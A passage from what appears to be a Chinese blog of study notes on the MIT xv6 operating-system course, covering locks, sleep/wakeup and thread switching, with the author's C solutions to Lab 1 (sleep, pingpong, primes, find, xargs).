s-&gt;count -= <span class="number">1</span>;</span><br><span class="line">    release(&amp;s-&gt;lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样即考虑了cpu资源还考虑了条件竞争。</p>
<p><code>pipe</code>就是利用锁和<code>sleep/wakeup</code>实现的，<code>exit/wait</code>也是。</p>
<p>总而言之，锁这块原理不绕，但是使用起来好绕啊。</p>
<h5 id="课程内容-1"><a href="#课程内容-1" class="headerlink" title="课程内容"></a>课程内容</h5><p>主要讲解thread switch</p>
<p>终于知道了定时器中断是个什么董熊了，每个核心都有一个定时器，这个定时器周期性的发出一些中断，这些中断就是定时器中断，所以就算程序没有主动陷入内核，在定时器发生的时候还是会陷入，此时就可以记录程序运行时长和是否切换程序的工作了。</p>
<p>在发生计时器中断的时候，内核处理程序就可以让出cpu给调度器，然后调度器切换线程，在xv6中，让出靠的是yields()函数。</p>
<p>进程之间的切换并不是从这个进程的直接切换到另一个进程的，而是从这个进程的内核线程（线程1）中切换到另一个进程的内核线程（线程2）中，然后在线程2中再自然返回到对应进程中（进程2）。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221011154315913.png" alt="image-20221011154315913"></p>
<h4 id="Lecture13"><a href="#Lecture13" class="headerlink" title="Lecture13"></a>Lecture13</h4><p>这节课主要讲解了sleep和wakeup，这是一种常见的协调机制。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221020144559437.png" alt="image-20221020144559437"></p>
<p>当sleep/wakeup不使用锁作为参数的话实现伪代码如上图，如果使用这种sleep/wakeup的话就会造成严重的<code>lost wakeup</code>问题，例子如下</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221020150533008.png" alt="image-20221020150533008"> </p>
<p><code>uartwrite</code>释放锁之后，中断线程就开始执行了，因为是多核心，所以就会造成一种局面，<code>wakup</code>比<code>slepp</code>提前执行，导致sleep的线程没有人去唤醒了。这就是<code>lsot wakeup</code>。</p>
<p>我以为处理办法是让释放锁和睡眠是原子的就好了，但是xv6并不是这样实现的，而是使用<code>p-&gt;lock</code>，这样也达到了效果。</p>
<p>老师对<code>wait</code>函数也进行了讲解，才明白过来其实子进程的资源回收并不是由子进程自己完成的，而是对自己状态进行标注为可以回收，然后父进程调用wait()的时候检查子进程然后回收。（当然不可能自己回收自己）。</p>
<h4 id="Lecture14"><a href="#Lecture14" class="headerlink" title="Lecture14"></a>Lecture14</h4><p>这节课主要是文件系统的讲解</p>
<h2 id="LAB"><a href="#LAB" class="headerlink" title="LAB"></a>LAB</h2><h3 id="Lab1-Xv6-and-Unix-utilities"><a href="#Lab1-Xv6-and-Unix-utilities" class="headerlink" title="Lab1: Xv6 and Unix utilities"></a>Lab1: Xv6 and Unix utilities</h3><p>这个实验主要是熟悉xv6的系统调用接口的。</p>
<h4 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;your parameter is not number\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(atoi(argv[<span class="number">1</span>]));</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="pingpong"><a href="#pingpong" class="headerlink" title="pingpong"></a>pingpong</h4><p>利用pipe完成父子进程之间双向通信，刚开始没理解透pipe,只用了一个管道，发现怎么都不对，看了别人的代码才恍然大雾，pipe只能完成单向通信，双向肯定得要两个管道啊,不过我错误那一版骗过了lab检查程序，乐</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rd 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> wt 1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p_to_child[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> p_to_parent[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">10</span>];</span><br><span class="line">    pipe(p_to_child);</span><br><span class="line">    pipe(p_to_parent);</span><br><span class="line">    <span class="keyword">int</span> pid=fork();</span><br><span class="line">    <span class="keyword">if</span>(pid&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;fork fail\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">        close(p_to_child[wt]);</span><br><span class="line">        close(p_to_parent[rd]);</span><br><span class="line">        <span class="keyword">int</span> ret=read(p_to_child[rd],buf,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;read fail\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">1</span>,<span class="string">&quot;%d: received ping\n&quot;</span>,getpid());</span><br><span class="line">        ret=write(p_to_parent[wt],<span class="string">&quot;1&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;write fail\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        close(p_to_child[rd]);</span><br><span class="line">        close(p_to_parent[wt]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        close(p_to_child[rd]);</span><br><span class="line">        close(p_to_parent[wt]);</span><br><span class="line">        <span class="keyword">int</span> ret=write(p_to_child[wt],<span class="string">&quot;1&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;write fail\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ret=read(p_to_parent[rd],buf,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;read fail\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">1</span>,<span class="string">&quot;%d: received pong\n&quot;</span>,getpid());</span><br><span class="line">        close(p_to_child[wt]);</span><br><span class="line">        close(p_to_parent[rd]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="primes"><a href="#primes" class="headerlink" title="primes"></a>primes</h4><p>这个程序还是比较麻烦的，要求利用fork和管道完成对素数的筛选，理论如下</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220807185230278.png" alt="image-20220807185230278"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rd 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> wt 1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> p_rd,<span class="keyword">int</span> c_wt)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> first_num=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> temp=<span class="number">0</span>;</span><br><span class="line">    read(p_rd,&amp;first_num,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="number">1</span>,<span class="string">&quot;prime %d\n&quot;</span>,first_num);</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="keyword">while</span>(read(p_rd,&amp;num,<span class="number">4</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(num%first_num!=<span class="number">0</span>)&#123;</span><br><span class="line">            temp++;</span><br><span class="line">            write(c_wt,&amp;num,<span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> c[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    pipe(p);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=<span class="number">35</span>;i++)&#123;</span><br><span class="line">        write(p[wt],&amp;i,<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> pid=fork();</span><br><span class="line">        <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">            pipe(c);</span><br><span class="line">            close(p[wt]);</span><br><span class="line">            <span class="keyword">int</span> ret=fun(p[rd],c[wt]);</span><br><span class="line">            close(p[rd]);</span><br><span class="line">            <span class="keyword">if</span>(ret==<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p[rd]=c[rd];</span><br><span class="line">            p[wt]=c[wt];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(p[wt])&#123;</span><br><span class="line">                close(p[wt]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(p[rd])&#123;</span><br><span class="line">                close(p[rd]);</span><br><span class="line">            &#125;</span><br><span class="line">            wait(&amp;status);</span><br><span class="line">            <span class="keyword">if</span>(status==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;wait fail\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><p>这个调了我半个早上🤦‍♀️，首先是程序退出时报错，我试了半天才发现xv6系统的main函数只能以exit()退出，其次是测试程序老是过不去，多方调试后发现自己的一块逻辑写的有明显问题，呜呜呜这明明只是中等难度，代码能力还是太菜了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/fs.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find</span><span class="params">(<span class="keyword">char</span> *file_path,<span class="keyword">char</span> *res)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> <span class="title">de</span>;</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">char</span> *p;</span><br><span class="line">    memmove(buf,file_path,<span class="built_in">strlen</span>(file_path));</span><br><span class="line">    <span class="keyword">int</span> fd=open(file_path,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;open fail\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (read(fd,&amp;de,<span class="keyword">sizeof</span>(de))==<span class="keyword">sizeof</span>(de))&#123;</span><br><span class="line">        <span class="keyword">if</span>(de.inum==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(de.name,<span class="string">&quot;.&quot;</span>)||!<span class="built_in">strcmp</span>(de.name,<span class="string">&quot;..&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        p=buf+<span class="built_in">strlen</span>(buf);</span><br><span class="line">        memmove(p, de.name, DIRSIZ);</span><br><span class="line">        <span class="keyword">if</span>(stat(buf,&amp;st)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;stat() fail filename :%s\n&quot;</span>,buf);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(st.type==T_FILE)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(de.name,res))&#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="number">1</span>,<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (st.type==T_DIR)</span><br><span class="line">        &#123;</span><br><span class="line">            p=buf+<span class="built_in">strlen</span>(buf);</span><br><span class="line">            *p=<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">            find(buf,res);</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">         memmove(buf,file_path,<span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">char</span> *p;</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;parameter fail\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    memmove(buf,argv[<span class="number">1</span>],DIRSIZ);</span><br><span class="line">    p=buf+<span class="built_in">strlen</span>(buf)<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(*p!=<span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">        p++;</span><br><span class="line">        *p=<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    find(buf,argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h4><p>主要麻烦的点在对字符串的处理上，我看别人的博客利用了有限自动机，嘿嘿，不会这个高端的东西，我的解决办法是对得到的字符串进行标准化，然后就利于后面的字符串处理了(无脑做法属于)。还有我的代码能力真得弱，这点代码花了我两个小时。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/fs.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_line_length</span><span class="params">(<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> line_length=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(buf[line_length]!=<span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">        line_length++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> line_length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> cur=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> line_num=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;argv fail\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> size=read(<span class="number">0</span>,buf,<span class="number">100</span>);</span><br><span class="line">    <span class="keyword">char</span> parm_buf[size+<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">memset</span>(parm_buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(parm_buf));</span><br><span class="line">    cur++;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size; i++,cur++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(buf[i]==<span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(buf[i]==<span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">            cur++;</span><br><span class="line">            parm_buf[cur]=<span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">            line_num++;</span><br><span class="line">            cur++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        parm_buf[cur]=buf[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(buf[size<span class="number">-1</span>]!=<span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">        line_num++;</span><br><span class="line">    &#125;</span><br><span class="line">    cur=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;line_num;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> add_parm_num=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> temp_cur=cur;</span><br><span class="line">        <span class="keyword">for</span>(;parm_buf[temp_cur]!=<span class="string">&#x27;\n&#x27;</span>;temp_cur++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(parm_buf[temp_cur]==<span class="number">0</span>&amp;&amp;parm_buf[temp_cur+<span class="number">1</span>]!=<span class="number">0</span>&amp;&amp;parm_buf[temp_cur+<span class="number">1</span>]!=<span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">                add_parm_num++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">char</span> *parm[add_parm_num+argc];</span><br><span class="line">        <span class="built_in">memset</span>(parm,<span class="number">0</span>,<span class="keyword">sizeof</span>(parm));</span><br><span class="line">        <span class="keyword">int</span> parm_cur=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;argc;j++,parm_cur++)&#123;</span><br><span class="line">            parm[parm_cur]=argv[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(;parm_buf[cur]!=<span class="string">&#x27;\n&#x27;</span>;cur++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(parm_buf[cur]==<span class="number">0</span>&amp;&amp;parm_buf[cur+<span class="number">1</span>]!=<span class="number">0</span>&amp;&amp;parm_buf[cur+<span class="number">1</span>]!=<span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">                parm[parm_cur]=&amp;parm_buf[cur+<span class="number">1</span>];</span><br><span class="line">                parm_cur++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cur++;</span><br><span class="line">        <span class="keyword">int</span> pid=fork();</span><br><span class="line">        <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">            exec(parm[<span class="number">0</span>],parm);</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;exec fail\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            wait(&amp;status);</span><br><span class="line">            <span class="keyword">if</span>(status==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot; wait fail\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span 